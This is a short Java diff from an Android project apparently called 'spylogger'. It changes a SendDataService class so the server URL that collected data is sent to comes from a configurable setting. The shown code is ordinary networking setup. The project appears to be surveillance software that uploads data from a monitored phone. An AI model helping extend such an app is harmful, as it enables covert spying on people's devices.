@@ -1,11 +1,13 @@
 package com.gravatasufoca.spylogger.services;
 
+import android.content.Context;
 import android.os.Message;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.gravatasufoca.spylogger.helpers.RequestInterceptor;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
+import com.gravatasufoca.spylogger.utils.Utils;
 
 import java.util.concurrent.TimeUnit;
 
@@ -26,7 +28,7 @@ public abstract class SendDataService<E> implements Callback<E>{
     protected SendDataInterface sendApi;
     protected TaskComplete handler;
 
-    public SendDataService(TaskComplete handler) {
+    public SendDataService(Context context,TaskComplete handler) {
         this.handler=handler;
         OkHttpClient.Builder client = new OkHttpClient.Builder();
         client.connectTimeout(10, TimeUnit.MINUTES);
@@ -41,7 +43,7 @@ public abstract class SendDataService<E> implements Callback<E>{
                 .create();
 
         retrofit=new Retrofit.Builder()
-                .baseUrl(SendDataInterface.apiUrl)
+                .baseUrl(Utils.getServerUrl(context))
                 .client(client.build())
                 .addConverterFactory(GsonConverterFactory.create(gson))
                 .build();
